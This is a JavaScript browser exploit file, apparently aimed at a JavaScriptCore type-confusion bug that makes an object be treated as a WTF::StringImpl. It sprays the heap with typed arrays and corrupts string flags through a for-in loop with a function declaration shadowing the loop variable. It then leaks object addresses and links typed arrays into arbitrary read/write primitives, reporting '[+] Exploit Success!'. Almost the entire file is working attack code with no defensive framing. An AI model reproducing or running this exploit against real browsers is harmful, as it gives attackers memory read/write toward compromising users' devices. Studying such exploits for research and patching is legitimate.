// Variables for addrof&fakeobj primitives
var g_leak_object = { a: 0 };
var g_leak_array = new Uint32Array(6);

// Variables for read/write
var g_arb_master = new Uint32Array(7);
var g_arb_slave = new Uint8Array(1024);

var g_struct_spray = []; // Array to hold the sprayed objects

// Begin spraying objects on the heap
for (let i = 0; i < 0x10000; i++) {
  let arr = new Uint32Array(1); // Create a new array
  arr[i + "spray"] = 123; // Fill the array with a specific value
  g_struct_spray.push(arr); // Add the array to the sprayed objects array
}
// Prepare element that will contain debug text
privDebugElement = document.createElement("p");
privDebugElement.setAttribute("id", "infc");
// Custom function that prints the formatted string onto the page
function printf(...args) {
  privDebugElement.innerHTML +=
    args
      .map((arg) => {
        return (
          (typeof arg === "object" ? JSON.stringify(arg) : arg.toString()) + " "
        );
      })
      .join(" ") + "<br>";
}
// Print the number of arrays sprayed
printf("[+] Total of " + g_struct_spray.length + " Sprayed");

// The target object structure
var target = {
  a: 2.1100820415101592e-303, // small point float property
  b: false, // boolean property
  c: true, // boolean property
  d: 5678 // integer property
};

// Create another target object for crashing purposes
var target2 = { a: 2.1100820415101592e-303, b: false, c: true, e: 5678 };

// Type-confused with WTF::StringImpl
var implIndex = 0;
function create_impl() {
  // The property (a) is type-confused with WTF::StringImplShape::m_hashAndFlags
  const implObj = { a: target };
  for (let i = 0; i < 32; i++, implIndex++) {
    implObj[implIndex + "x"] = {};
  }
  return implObj;
}

// Convert a number to a hexadecimal string
function hexNum(input) {
  return "0x" + Number(input).toString(16);
}

function trigger(x) {
  if (impl.a != target) {
    console.log("wtf?");
    while (1);
  }
  // Property (a) is type-confused with WTF::String::m_impl
  var o = { a: 1 };
  for (var i in o) {{
      i = x;
      function i() {}
    }o[i];// This sets bit 4 (|= 16) in WTF::StringImplShape::m_hashAndFlags
  }
  if (impl.a != target) {
    printf("[+] Successfully Corrupted!");
    printf("[?] Impl is an" + typeof impl);
    printf("[?] Impl->a length is " + impl.a.length);
    printf("[?] Impl->a is an " + typeof impl.a);
    target.c = g_leak_object;
    g_leak_object.a = g_leak_object;
    var l1 = impl.a[4], l2 = impl.a[5];
    g_leak_object.a = g_arb_slave;
    var s1 = impl.a[4], s2 = impl.a[5];
    target.c = g_leak_array;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = g_arb_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    printf("[+] l1:" + hexNum(l1));
    printf("[+] l2:" + hexNum(l2));
    printf("[+] s1:" + hexNum(s1));
    printf("[+] s2:" + hexNum(s2));
    throw "[+] Exploit Success!";
  }
}
printf("[*] Spraying WTF::StringImpl Objects");
try {
  for (var _ = 0; _ < 1024; _++) {
    //JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
    var impl = create_impl();
    trigger({ a: impl });
  }
} catch (e) {
  printf(e);
}
